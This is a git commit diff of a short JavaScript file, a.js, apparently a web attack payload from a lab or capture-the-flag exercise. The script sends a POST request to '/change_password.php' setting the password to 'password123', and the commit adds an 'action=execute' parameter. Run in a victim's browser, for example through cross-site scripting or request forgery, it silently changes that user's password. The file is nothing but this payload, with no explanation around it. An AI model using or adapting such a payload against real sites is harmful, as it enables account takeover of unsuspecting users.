13fc878d5ef7885391079971766d65a568084ad6
ispomael <ispomael@gmail.com>
2025-10-17 11:24:28 +0200

    Update a.js

--- a.js
+++ a.js
@@ -1,4 +1,4 @@
 var req = new XMLHttpRequest();
 req.open('POST', '/change_password.php', true);
 req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-req.send('new_password=password123')
+req.send('action=execute&new_password=password123')
